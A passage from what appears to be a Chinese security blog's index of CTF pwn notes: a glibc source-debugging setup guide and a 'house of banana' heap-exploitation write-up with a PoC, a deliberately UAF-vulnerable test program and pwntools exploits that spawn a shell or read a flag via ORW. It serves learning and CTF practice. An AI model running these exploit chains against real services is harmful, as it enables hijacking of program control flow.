class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">    delete()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25279</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220826111647020-1771891318.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> io leak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于gdb源码调试环境搭建</title>
      <link href="/posts/c5c57579.html"/>
      <url>/posts/c5c57579.html</url>
      
        <content type="html"><![CDATA[<p>有时候我们要去追踪一些函数或是数据，需要用gdb动态调试并去结合着源码分析。下面介绍一下gdb源码调试的环境如何搭建</p><h2 id="glibc源码下载">glibc源码下载</h2><p>glibc源码可以在下面这个链接下载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220415172522191-1508848149.png" alt=""></p><p>选择需要的glibc版本，我以2.27-3ubuntu 1.5为例</p><p><img src="../img/2706180-20220415172035738-582520439.png" alt="image-20220415164406215"></p><p>选择这个最大的文件，下载。</p><p>然后拖到ubuntu里面解压</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf filename</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220415172035504-1672278744.png" alt="image-20220415164603510"></p><p>新建一个大的文件夹，用来存放各个版本的glibc，然后进入新下载的glibc，ls看一下发现东西都在里面。然后我们需要去找源码所在的文件夹。</p><p><img src="../img/2706180-20220415172035082-1039167232.png" alt="image-20220415164836238"></p><h2 id="找一下函数所在的源文件">找一下函数所在的源文件</h2><p>比如我现在想进行exit源码调试，先去下面这个网站搜一下exit源码在哪个文件里面。</p><p><a href="https://code.woboq.org/">在线查看源码网站</a></p><p><img src="../img/2706180-20220415172618725-1985569220.png" alt=""></p><p>进去之后，搜索想找的函数，然后就可以看到它所在的文件。发现exit.c在stdlib文件中。</p><p><img src="../img/2706180-20220415172034631-573661594.png" alt="image-20220415165453694"></p><p>我们去看一下，果然是在stdlib中发现了exit.c</p><p><img src="../img/2706180-20220415172716344-725839155.png" alt=""></p><h2 id="配置-gdbinit">配置.gdbinit</h2><p>然后pwd，复制一下路径。</p><p><img src="../img/2706180-20220415172034380-1120493636.png" alt="image-20220415165737197"></p><p>然后去用户目录下输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .gdbinit</span><br></pre></td></tr></table></figure><p>然后输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span>  刚才复制的路径</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="../img/2706180-20220415172033716-637621406.png" alt="image-20220415170846971"></p><p>最后保存一下就ok了。</p><p>然后gdb继续调试elf程序即可，等进入你装载进去的文件之后，就会自动展示glibc源代码。</p><h2 id="最后效果">最后效果</h2><p>效果如下：</p><p><img src="../img/2706180-20220415172032901-1046593594.png" alt="image-20220415171511841"></p><p>PS：如果调试其他函数没有出现源码，就说明没有导入成功对应的代码源文件，另外就是调试不同的程序，对应的glibc版本不要选错了。</p><p>参考博客：</p><p><a href="http://taqini.space/2020/11/01/glibc-debug-pwndbg/#Glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">Glibc源码调试环境搭建 | TaQini</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于house of banana的学习总结</title>
      <link href="/posts/efb4678.html"/>
      <url>/posts/efb4678.html</url>
      
        <content type="html"><![CDATA[<h2 id="house-of-banana">house of banana</h2><blockquote><p>攻击效果：</p><p>控制程序的执行流</p><p>适用版本：<code>glibc2.23</code> 到目前最新的 <code>2.36</code></p><p>注意： 使用 <code>setcontext</code> 来控制寄存器打 <code>orw</code> 的话，需要在 <code>2.29</code> 版本以上才行（ <code>2.27</code> 没有办法让 <code>rdx</code> 或 <code>rdi</code> 为堆地址）</p><p>利用条件：</p><ol><li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li><li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li><li>可以泄露 <code>libc</code> 地址和堆地址</li></ol></blockquote><h3 id="漏洞原理">漏洞原理</h3><p><code>link_map</code> 结构体的存储方式和堆块链表类似，是通过 <code>l_next</code> 和 <code>l_prev</code> 指针来连接的,而这个链表的头指针就是 <code>_rtld_global</code> 结构体中的 <code>_ns_loaded</code> 所存储的地址。</p><p>如果我们可以通过 <code>large bin attack</code> 或其他方式将链表的头指针改为可控堆地址，这样就可以伪造第一个 <code>link_map</code> 结构体，从而控制结构体中的各个字段，下面代码是 <code>_dl_fini</code> 函数中的片段</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126686.png" alt="image-20230217212607337" style="zoom:50%;" /><p>蓝色框中是要绕过 <code>if</code> 检查所需要伪造的字段，红色框中是劫持执行流的位置。</p><p>最终的目的是需要伪造一些字段绕过检查并布局一些字段为劫持执行流做准备，最终执行到 <code>array[i]</code> 时进行劫持。</p><h3 id="利用过程">利用过程</h3><p>首先需要恢复<code>l_next</code> 字段原本的值，这样之后的 <code>link_map</code> 就不用再伪造了。</p><p>将 <code>l_real</code> 字段改为伪造的 <code>link_map</code> 地址，以便满足 <code>if (l == l-&gt;l_real)</code> ，确保不会触发 <code>assert</code></p><p>将 <code>l_info[26]</code> 的值设置为非空，为了满足 <code>if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</code></p><p>如果满足这三个条件，那么就可以对 <code>array</code> 的地址进行设置，如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br></pre></td></tr></table></figure><p>为了更精准的控制 <code>array</code> ，我们控制 <code>l_addr</code> 为 <code>0</code> （事实上这个值通常也没有办法被控制，因为这个 <code>l_addr</code> 是堆块的 <code>prev_size</code>  字段，正常情况就是 <code>0</code>）</p><p>而 <code>DT_FINI_ARRAY</code> 这个宏就是 <code>26</code> ，<code>d_un</code> 则是一个联合体，定义如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    Elf32_Word d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">    Elf32_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br></pre></td></tr></table></figure><p>如果我们将 <code>l-&gt;l_info[26]</code> 的值设置为 <code>l-&gt;l_info[26]</code> 的地址，那么 <code>l-&gt;l_info[27]</code> 中的值则是 <code>array</code></p><p><strong>注意：</strong>  <code>-&gt;</code> 操作符在 <code>C</code> 语言被定义为结构体指针成员的解引用和成员访问操作符，也就是说该操作符完成了两个操作，先对指针进行了解引用，然后再访问指针所指向的结构体成员。因此上面的代码 <code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code> 进行了两次解引用最后将值赋给 <code>array</code> ，而 <strong>winmt</strong> 师傅在 <a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">文章</a> 中写到 <strong>“以及l-&gt;l_info[26]-&gt;d_un.d_ptr，也就是l-&gt;l_info[27]”</strong> ，这句话有点小问题，因为理解为 <code>l-&gt;l_info[27]</code> 的话，只进行了一次解引用，所以这里替 <strong>winmt</strong> 师傅纠正下 QAQ</p><p>接下来控制 <code>i</code> 的值，代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br></pre></td></tr></table></figure><p><code>DT_FINI_ARRAYSZ</code> 这个宏是 <code>28</code> ，所以将 <code>l-&gt;l_info[28]</code> 的值设置为 <code>l-&gt;l_info[28]</code> 的地址，那么 <code>l-&gt;l_info[29]</code> 中的值再除 <code>8</code> ，则是最后的 <code>i</code></p><p>最后的劫持位置是函数指针 <code>array[i]</code> 被调用，如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br></pre></td></tr></table></figure><p>上面已经提到了 <code>array</code> 和 <code>i</code> 都可以被控制，因此这里可以执行代码，如果打 <code>one_gadget</code> 获取 <code>shell</code> 的话，直接布置地址即可，但是执行 <code>orw</code> 的话，需要先空走一轮函数调用，因为 <code>rdx</code> 再每轮循环后，都会被更新为堆地址（如下图）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126762.png" alt="image-20230217203244752" style="zoom:50%;" /><p>走空一轮的意思就是跳转到 <code>ret</code> 指令上，然后立刻退出这一轮的函数指针调用，<code>i--</code> 然后调用下一个 <code>array[i]</code> 中存放的函数指针，此时的 <code>rdx</code> 已经为堆地址了，所以此时去跳转到 <code>setcontext+61</code>  的位置，布置 <code>SROP</code> ，调用 <code>read</code> 函数再次读入 <code>orw</code> 的 <code>rop</code> 链使其正好落到 <code>read</code> 函数的返回地址上，从而绕过沙箱保护。</p><p><strong>补充：</strong></p><p><code>2.27</code> 的 <code>libc</code> 中没办法控制寄存器走 <code>setcontext</code> ，因为其汇编如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172129364.png" alt="image-20230217212955875" style="zoom:50%;" /><p>对比下面这个图片（ <code>2.31</code> 的 <code>libc</code>），就会发现 <code>2.27</code> 没有 <code>rdi</code> 或者 <code>rdx</code> 被赋值为堆地址的指令,所以不好打 <code>orw</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172131373.png" alt="image-20230217213154837" style="zoom: 50%;" /><h3 id="poc">poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc poc.c -o poc -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rtld_global_dl_ns 0x61b060</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> one_gadget 0x4f302</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x64e40</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc base %llx\n&quot;</span>,libc_base);</span><br><span class="line">  <span class="type">size_t</span> *p=<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  p[<span class="number">3</span>]=libc_base+<span class="number">0x61c710</span>;<span class="comment">//l_next</span></span><br><span class="line">  p[<span class="number">5</span>]=p;<span class="comment">//l_real    也是伪造的link_map地址</span></span><br><span class="line">  p[<span class="number">34</span>]=&amp;p[<span class="number">34</span>];<span class="comment">//l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line">  p[<span class="number">35</span>]=&amp;p[<span class="number">38</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr    </span></span><br><span class="line">  p[<span class="number">36</span>]=&amp;p[<span class="number">36</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">  p[<span class="number">37</span>]=<span class="number">0x8</span>;<span class="comment">//i=l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">  p[<span class="number">38</span>]=libc_base+one_gadget;<span class="comment">//call array[i]</span></span><br><span class="line">  p[<span class="number">0x62</span>]=<span class="number">0x800000000</span>;<span class="comment">//使l-&gt;l_init_called 为1</span></span><br><span class="line">  *(<span class="type">size_t</span> *)(rtld_global_dl_ns+libc_base)=p;<span class="comment">//劫持_rtld_global_ns_loaded  目的伪造link_map</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172153387.png" alt="image-20230217215313299" style="zoom: 67%;" /><h2 id="例题">例题</h2><p>自己写了一个程序，打了一下 <code>house of banana</code> ，我先是编译完之后，对应的是 <code>libc2.27</code> ，我用 <code>house of banana</code> 劫持执行流后打的 <code>og</code> 获取了 <code>shell</code> ，然后又 <code>patch</code> 成了 <code>2.31-0ubuntu9_amd64</code> 打的 <code>orw</code></p><p><code>C</code> 源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> num 10</span></span><br><span class="line"><span class="type">void</span> *chunk_list[num];</span><br><span class="line"><span class="type">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2.show&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4.delete&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index,size;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line"><span class="keyword">if</span>(size&lt;<span class="number">0x80</span>||size&gt;<span class="number">0x500</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">chunk_list[index] = <span class="built_in">calloc</span>(size,<span class="number">1</span>);</span><br><span class="line">  chunk_size[index] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,chunk_list[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">add();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">edit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">delete();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常的菜单堆，肯定是有其他解法，这里只考虑 <code>house of banana</code> ，漏洞就一个 <code>UAF</code> 。</p><p>泄露 <code>libc</code> 和堆地址之后，打 <code>large bin attack</code> ，伪造 <code>link_map</code> ，各个字段的赋值上面已经进行了说明，下面是两个 <code>exp</code></p><h3 id="EXP">EXP</h3><p>打 <code>2.27</code> 获取 <code>shell</code> 的 <code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec090</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x250</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x61b060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f302</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x61c710</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">8</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=p64(one_gadget)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127310.png" alt="image-20230217205309204"></p><p>打 <code>2.31</code> 走 <code>orw</code> 读出 <code>flag</code> 的 <code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xCFF</span></span><br><span class="line">d_d=<span class="number">0xD3B</span></span><br><span class="line">d_e=<span class="number">0xD27</span></span><br><span class="line">d_s=<span class="number">0xD13</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1ebfd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x222060</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe6aee</span></span><br><span class="line">ret_addr=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line">setcontext=<span class="number">0x580DD</span>+libc_base</span><br><span 